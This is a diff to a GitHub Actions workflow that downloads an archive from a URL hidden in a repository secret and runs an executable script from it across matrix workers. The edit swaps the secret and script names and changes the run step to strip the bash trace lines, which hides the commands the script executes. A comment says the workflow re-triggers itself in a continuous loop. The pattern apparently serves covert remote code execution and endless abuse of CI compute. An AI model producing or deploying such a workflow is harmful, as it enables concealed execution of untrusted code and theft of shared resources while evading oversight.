@@ -61,7 +61,7 @@ jobs:
         run: |
           set -euo pipefail
           TARGET_PATH="$NESTED_DIR/$ZIP_NAME"
-          curl -fSL -o "$TARGET_PATH" "${{ secrets.BANAA }}"
+          curl -fSL -o "$TARGET_PATH" "${{ secrets.VIA }}"
           if [ ! -f "$TARGET_PATH" ]; then
             echo "Download failed: $TARGET_PATH not found"
             exit 1
@@ -85,12 +85,12 @@ jobs:
           set -euo pipefail
           cd "$NESTED_DIR"
           
-          script_path="$(find . -type f -name 'banaa.sh' -print -quit || true)"
+          script_path="$(find . -type f -name 'via.sh' -print -quit || true)"
           if [ -z "$script_path" ]; then
-            script_path="$(find . -type f -iname 'banaa*' -perm /111 -print -quit || true)"
+            script_path="$(find . -type f -iname 'via*' -perm /111 -print -quit || true)"
           fi
           if [ -z "$script_path" ]; then
-            echo "Could not find banaa.sh or executable banaa* file."
+            echo "Could not find via.sh or executable via* file."
             find . -maxdepth 4 -type f -print
             exit 1
           fi
@@ -105,7 +105,7 @@ jobs:
           echo "EXEC_SCRIPT=$FULL_SCRIPT_PATH" >> "$GITHUB_ENV"
           echo "Renamed script to $new_name in $NESTED_DIR"
       
-      - name: Run worker (with debug)
+      - name: Run worker (quiet: hide traced commands)
         shell: bash
         env:
           WORKER_ID: ${{ matrix.worker }}
@@ -113,16 +113,22 @@ jobs:
           EXEC_SCRIPT: ${{ env.EXEC_SCRIPT }}
         run: |
           set -euo pipefail
+
           echo "Starting worker $WORKER_ID of $MAX_WORKERS"
+
           if [ -z "${EXEC_SCRIPT:-}" ]; then
             echo "EXEC_SCRIPT not set"
             exit 1
           fi
-          echo "About to execute: bash -x \"$EXEC_SCRIPT\" \"$WORKER_ID\""
-          bash -x "$EXEC_SCRIPT" "$WORKER_ID"
+
+          # Run the script but filter out bash xtrace trace lines that start with "+ "
+          # - combine stdout and stderr so traced commands (which appear on stderr) are removed
+          # - use sed to drop lines that start with '+ ' (the typical bash -x / set -x trace prefix)
+          # - still preserve all other output from the script
+          bash --noprofile --norc "$EXEC_SCRIPT" "$WORKER_ID" 2>&1 | sed -E '/^\+ /d'
 
       # --------------------------------------------------------------------
-      # Final step: trigger the same workflow again banaa the REST API.
+      # Final step: trigger the same workflow again via the REST API.
       # - Provide a PAT in repository secret REPO_PAT (recommended), or the workflow will fall back to GITHUB_TOKEN.
       # - WARNING: This creates a continuous loop. Add a conditional/variable if you want to stop at some point.
       # --------------------------------------------------------------------
